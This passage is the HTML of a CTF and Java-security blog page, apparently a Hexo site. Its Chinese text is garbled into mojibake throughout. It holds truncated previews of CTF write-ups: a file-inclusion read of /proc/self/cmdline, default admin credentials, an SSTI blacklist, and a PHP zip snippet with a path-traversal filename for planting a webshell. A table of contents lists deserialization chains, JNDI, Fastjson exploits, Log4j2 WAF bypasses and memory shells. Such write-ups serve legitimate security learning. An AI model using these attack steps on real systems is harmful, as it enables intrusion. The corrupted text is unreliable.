å‹ç¼©åŒ…é‡Œé¢æœ‰ä¸ªå›¾ç‰‡ PNG æ–‡ä»¶çš„å°¾éƒ¨æ ‡è¯†ç¬¦ 49 45 4E 44 AE 42 60 82  æå–å‡ºåè¾¹å¤šä½™çš„æ–‡ä»¶base64è§£å¯†ğŸ‘‡å‡ºæ¥ä¸ªè¿™ä¸ª 1234567if __name__ == &#x27;__main__&#x27;:    try:        import secretMessageResponse    except ImportError:        import pip        pip.main([&#x27;install&#x27;, &#x27;secretMessageResponse&#x27;])        from secretMessageResponse import printMessage  æ‹¿pythonè¿è¡Œä¸€ä¸‹æ²¡å‡ºæ¥ä¸€å †æ•°æ® å»æ‰¾åº“ğŸ‘‡ pip show secretMessageResponse  cryptoç¯å¢ƒé—®é¢˜from Crypto.PublicKey import RSA...</div></div></div></a><a class="pagination-related" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24å›½åŸæ¯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">24å›½åŸæ¯</div></div><div class="info-2"><div class="info-item-1">2024å›½åŸæ¯1Easy Jellyjavaæ¬ ç€ 2Ez_Gallery è´¦å·adminï¼›å¯†ç 123456ï¼›ç›´æ¥çˆ†ä¹Ÿè¡Œï¼ŒéªŒè¯ç å¯ä»¥é‡å¤ç”¨  å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä¸çŸ¥é“flagåœ¨å“ª info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdlineå‘ç°é¢˜ç›®app.pyï¼›ç„¶åå»è¯»å–é¢˜ç›®æºç  æºç çš„shellè·¯ç”±æ˜¯ä¸ªsstiæ”»å‡»ç‚¹ é»‘åå• 12345678blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]if any(re.search(pattern, expression) for pattern in blacklist_patterns):return Response(&#x27;wafwafwaf&#x27;)try:result...</div></div></div></a><a class="pagination-related" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24å¼ºç½‘æ¯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-26</div><div class="info-item-2">24å¼ºç½‘æ¯</div></div><div class="info-2"><div class="info-item-1">24å¼ºç½‘PyBlocklyé¢˜ç›®æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158from flask import Flask, request, jsonifyimport reimport unidecodeimport stringimport astimport sysimport...</div></div></div></a><a class="pagination-related" href="/2025/01/20/25suctf/" title="25suctf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-20</div><div class="info-item-2">25suctf</div></div><div class="info-2"><div class="info-item-1">Suctf2025â€“2æ ‡è¯†ä¸ºçœ‹çš„wpï¼Œæ²¡ç¯å¢ƒå¤ç°äº† æ‰€æœ‰å‚è€ƒèµ„æ–™å°†åœ¨æ–‡æœ¬æœ«å°¾æ ‡æ˜ WEBSU_photogalleryæ€è·¯ğŸ‘‡ æ„é€ ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å‡ºæˆ‘ä»¬æƒ³è§£å‹çš„éƒ¨åˆ†ï¼Œç„¶åå…¶ä»–éƒ¨åˆ†æ˜¯æŸåçš„ï¼Œè¿™æ ·æ˜¯ä¸æ˜¯å°±å¯ä»¥è®©æ•´ä¸ªè§£å‹è¿‡ç¨‹æ˜¯å‡ºé”™çš„ä»è€Œè¿›å…¥åˆ°ifé‡Œï¼Œæˆ‘ä»¬çš„shellå°±è¿™æ ·ç•™ä¸‹äº† å…ˆæ˜¯phpç‰ˆæœ¬çš„æ¼æ´ å†æ ¹æ®æºç æ¼æ´ä¸Šç  ä¸‰ç§å†™ç æ–¹æ³•å¦‚ä¸‹ğŸ‘‡ æ³•ä¸€12345678910111213&lt;?php$zip = new ZipArchive();$zipFilePath = &#x27;exp.zip&#x27;;if ($zip-&gt;open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) &#123;    $zip-&gt;addFile(&#x27;1.php&#x27;, &quot;..\./..\./a.jpg&quot;);    $zip-&gt;close();    echo &quot;ok&quot;;&#125;?&gt;  é…ä¸Š 12345GET...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">å¸ˆå‚…åŠ ä¸ªè”ç³»æ–¹å¼ï¼Œè®¨è®ºäº¤æµå­¦ä¹ ï¼Œè‹¥æœ‰ä¸è¶³è¿˜è¯·å¸ˆçˆ¶æŒ‡å‡º</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vscode%E7%AA%81%E7%84%B6%E4%B8%8D%E7%BC%96java%E4%BB%A3%E7%A0%81%E4%BA%86%EF%BC%8C%E4%BF%AE%E7%90%86%E4%BA%86%E4%B8%80%E4%B8%8B"><span class="toc-number">1.</span> <span class="toc-text">vscodeçªç„¶ä¸ç¼–javaä»£ç äº†ï¼Œä¿®ç†äº†ä¸€ä¸‹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">ç‰ˆæœ¬</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#idea%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">ideaç ´è§£</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">æŸ¥è¯¢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A8%E9%83%A8%E9%93%BE%E5%AD%90%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">5.</span> <span class="toc-text">å…¨éƒ¨é“¾å­æµç¨‹å›¾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E5%8C%85"><span class="toc-number">6.</span> <span class="toc-text">å¯¼åŒ…</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#maven3-2-1"><span class="toc-number">6.1.</span> <span class="toc-text">maven3.2.1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#maven4"><span class="toc-number">6.2.</span> <span class="toc-text">maven4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8"><span class="toc-number">7.</span> <span class="toc-text">javaå®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.1.</span> <span class="toc-text">ååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE"><span class="toc-number">7.2.</span> <span class="toc-text">ååºåˆ—åŒ–é¢˜ç›®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-number">7.3.</span> <span class="toc-text">åå°„</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.3.1.</span> <span class="toc-text">1å®ä¾‹åŒ–å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%8E%B7%E5%8F%96%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">7.3.2.</span> <span class="toc-text">2è·å–ç±»é‡Œé¢çš„å±æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E4%BF%AE%E6%94%B9%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">7.3.3.</span> <span class="toc-text">3ä¿®æ”¹ç±»é‡Œé¢çš„å±æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B0%83%E7%94%A8%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.3.4.</span> <span class="toc-text">4è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5hashmap%E5%B8%A6url"><span class="toc-number">7.3.5.</span> <span class="toc-text">5hashmapå¸¦url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">7.4.</span> <span class="toc-text">åŠ¨æ€ä»£ç†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%80%9A%E8%BF%87%E5%85%B6%E4%BB%96%E5%AF%B9%E8%B1%A1%E8%AE%BF%E9%97%AE%E6%BA%90%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.4.1.</span> <span class="toc-text">1é€šè¿‡å…¶ä»–å¯¹è±¡è®¿é—®æºå¯¹è±¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">7.4.1.1.</span> <span class="toc-text">é™æ€ä»£ç†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-1"><span class="toc-number">7.4.1.2.</span> <span class="toc-text">åŠ¨æ€ä»£ç†</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%BE%85%E5%8A%A9%E5%87%BD%E6%95%B0"><span class="toc-number">8.</span> <span class="toc-text">ä½¿ç”¨è¾…åŠ©å‡½æ•°</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CC6%E9%93%BE%E5%AD%90"><span class="toc-number">9.</span> <span class="toc-text">CC6é“¾å­</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">9.1.</span> <span class="toc-text">æ“ä½œ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E9%93%BE%E5%AD%90"><span class="toc-number">9.1.1.</span> <span class="toc-text">å®Œæ•´é“¾å­</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">9.2.</span> <span class="toc-text">åŸç†</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CC3%E9%93%BE%E5%AD%90"><span class="toc-number">10.</span> <span class="toc-text">CC3é“¾å­</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">10.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aes%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC"><span class="toc-number">10.2.</span> <span class="toc-text">aesåŠ å¯†è„šæœ¬</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro721"><span class="toc-number">11.</span> <span class="toc-text">Shiro721</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI"><span class="toc-number">12.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dispatch%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB"><span class="toc-number">12.1.</span> <span class="toc-text">dispatchå¯¹åº”å…³ç³»</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI"><span class="toc-number">13.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B01"><span class="toc-number">13.1.</span> <span class="toc-text">å¤ç°1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B02"><span class="toc-number">13.2.</span> <span class="toc-text">å¤ç°2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B03"><span class="toc-number">13.3.</span> <span class="toc-text">å¤ç°3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8u191%E4%B9%8B%E5%89%8D"><span class="toc-number">13.3.1.</span> <span class="toc-text">8u191ä¹‹å‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u191%E4%B9%8B%E5%90%8E"><span class="toc-number">13.3.2.</span> <span class="toc-text">8u191ä¹‹å</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">13.3.2.1.</span> <span class="toc-text">æ¡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">13.3.2.2.</span> <span class="toc-text">åˆ©ç”¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-LDAP-%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0-Gadget"><span class="toc-number">13.3.2.3.</span> <span class="toc-text">åˆ©ç”¨-LDAP-è¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°-Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">13.3.2.3.1.</span> <span class="toc-text">å®¢æˆ·ç«¯</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson"><span class="toc-number">14.</span> <span class="toc-text">Fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">14.1.</span> <span class="toc-text">åŸºç¡€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-24"><span class="toc-number">14.2.</span> <span class="toc-text">-1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">14.2.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pom-xml"><span class="toc-number">14.2.2.</span> <span class="toc-text">pom.xml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25%E5%88%86%E6%9E%90"><span class="toc-number">14.3.</span> <span class="toc-text">-1.2.25åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#autoTypeSupport"><span class="toc-number">14.3.1.</span> <span class="toc-text">autoTypeSupport</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-41"><span class="toc-number">14.4.</span> <span class="toc-text">25-41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87"><span class="toc-number">14.4.1.</span> <span class="toc-text">è¡¥ä¸ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42%E5%BC%80%E5%A7%8B%E4%BB%A5hash%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">14.4.2.</span> <span class="toc-text">42å¼€å§‹ä»¥hashé»‘åå•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#25-42"><span class="toc-number">14.4.2.1.</span> <span class="toc-text">25-42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25-43"><span class="toc-number">14.4.2.2.</span> <span class="toc-text">25-43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25-45"><span class="toc-number">14.4.2.3.</span> <span class="toc-text">25-45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25-47"><span class="toc-number">14.4.2.4.</span> <span class="toc-text">25-47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#49"><span class="toc-number">14.4.2.5.</span> <span class="toc-text">49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-59"><span class="toc-number">14.4.2.6.</span> <span class="toc-text">5-59</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-60"><span class="toc-number">14.4.2.7.</span> <span class="toc-text">5-60</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-61"><span class="toc-number">14.4.2.8.</span> <span class="toc-text">5-61</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-48"><span class="toc-number">14.4.3.</span> <span class="toc-text">1.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%88%86%E6%9E%90"><span class="toc-number">14.4.3.1.</span> <span class="toc-text">åˆå§‹åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-62"><span class="toc-number">14.4.4.</span> <span class="toc-text">1.2.62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-66"><span class="toc-number">14.4.5.</span> <span class="toc-text">1.2.66</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-67"><span class="toc-number">14.4.6.</span> <span class="toc-text">1.2.67</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-68"><span class="toc-number">14.4.7.</span> <span class="toc-text">1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%E4%BB%A3%E7%A0%81"><span class="toc-number">14.4.7.1.</span> <span class="toc-text">expä»£ç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">14.4.8.</span> <span class="toc-text">å®é™…åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">14.4.8.1.</span> <span class="toc-text">æ–‡ä»¶è¯»å–</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B1%BB"><span class="toc-number">14.4.8.1.1.</span> <span class="toc-text">åˆ©ç”¨ç±»</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">14.4.8.1.2.</span> <span class="toc-text">ä¾èµ–</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#poc"><span class="toc-number">14.4.8.1.3.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">14.4.8.2.</span> <span class="toc-text">æ–‡ä»¶å†™å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96-1"><span class="toc-number">14.4.8.2.1.</span> <span class="toc-text">ä¾èµ–</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#poc-1"><span class="toc-number">14.4.8.2.2.</span> <span class="toc-text">poc</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#68%E5%BE%80%E5%90%8E%E5%A2%9E%E5%8A%A0%E4%BA%86safeMode"><span class="toc-number">14.5.</span> <span class="toc-text">68å¾€åå¢åŠ äº†safeMode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Log4j2"><span class="toc-number">15.</span> <span class="toc-text">Log4j2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3"><span class="toc-number">15.1.</span> <span class="toc-text">å®˜æ–¹æ–‡æ¡£</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81"><span class="toc-number">15.2.</span> <span class="toc-text">åŸºç¡€å¤ç°ä»£ç </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">15.2.1.</span> <span class="toc-text">ç¯å¢ƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">15.2.1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#log4j2-xml"><span class="toc-number">15.2.1.2.</span> <span class="toc-text">log4j2.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%811"><span class="toc-number">15.2.1.3.</span> <span class="toc-text">æ¼æ´ä»£ç 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%A9%E7%94%A82"><span class="toc-number">15.2.1.4.</span> <span class="toc-text">æ¼æ´ä»£ç åˆ©ç”¨2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">15.2.2.</span> <span class="toc-text">è°ƒè¯•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95waf%E7%BB%95%E8%BF%87"><span class="toc-number">15.2.2.1.</span> <span class="toc-text">ç®€å•wafç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">15.2.2.1.1.</span> <span class="toc-text">ä¸€</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">15.2.2.1.2.</span> <span class="toc-text">äºŒ</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">15.2.2.1.3.</span> <span class="toc-text">ä¸‰</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9B"><span class="toc-number">15.2.2.1.4.</span> <span class="toc-text">å››</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%94"><span class="toc-number">15.2.2.1.5.</span> <span class="toc-text">äº”</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%AD"><span class="toc-number">15.2.2.1.6.</span> <span class="toc-text">å…­</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%82%B9%E4%B8%9C%E8%A5%BF"><span class="toc-number">15.2.3.</span> <span class="toc-text">è·å–ç‚¹ä¸œè¥¿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j2-2-15-0-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">15.2.4.</span> <span class="toc-text">Log4j2 2.15.0 æ¼æ´ä¿®å¤ä¸ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">15.2.4.1.</span> <span class="toc-text">ä¿®å¤</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%A0%81"><span class="toc-number">16.</span> <span class="toc-text">å†…å­˜ç </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80-1"><span class="toc-number">16.1.</span> <span class="toc-text">åŸºç¡€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat"><span class="toc-number">16.2.</span> <span class="toc-text">tomcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%81"><span class="toc-number">16.3.</span> <span class="toc-text">ç </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E7%A0%81"><span class="toc-number">16.3.1.</span> <span class="toc-text">ä¼ ç»Ÿç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E7%A0%81"><span class="toc-number">16.3.2.</span> <span class="toc-text">å›æ˜¾ç </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter%E7%A0%81"><span class="toc-number">16.4.</span> <span class="toc-text">filterç </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">17.</span> <span class="toc-text">äºŒæ¬¡ååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%BA%BF"><span class="toc-number">17.1.</span> <span class="toc-text">è·¯çº¿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83"><span class="toc-number">17.2.</span> <span class="toc-text">æ ¸å¿ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signedObject"><span class="toc-number">17.3.</span> <span class="toc-text">signedObject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A81rome"><span class="toc-number">17.3.1.</span> <span class="toc-text">å¼•ç”¨1rome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80tostring"><span class="toc-number">17.3.2.</span> <span class="toc-text">ä¸€tostring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8Cequal"><span class="toc-number">17.3.3.</span> <span class="toc-text">äºŒequal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89ObjectBean"><span class="toc-number">17.3.4.</span> <span class="toc-text">ä¸‰ObjectBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A82cb"><span class="toc-number">17.3.5.</span> <span class="toc-text">å¼•ç”¨2cb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACfastjson%EF%BC%8C"><span class="toc-number">17.3.6.</span> <span class="toc-text">é«˜ç‰ˆæœ¬fastjsonï¼Œ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80BadAttributeValueExpException-readObject"><span class="toc-number">17.3.6.1.</span> <span class="toc-text">ä¸€BadAttributeValueExpException#readObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8CHotSwappableTargetSource"><span class="toc-number">17.3.6.2.</span> <span class="toc-text">äºŒHotSwappableTargetSource</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMIConnector"><span class="toc-number">17.4.</span> <span class="toc-text">RMIConnector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WrapperConnectionPoolDataSource"><span class="toc-number">17.5.</span> <span class="toc-text">WrapperConnectionPoolDataSource</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-Hex"><span class="toc-number">17.5.1.</span> <span class="toc-text">C3P0_Hex</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jackson"><span class="toc-number">18.</span> <span class="toc-text">jackson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DefaultTyping"><span class="toc-number">18.1.</span> <span class="toc-text">DefaultTyping</span></a><ol class="toc-child"><li class="toc-item 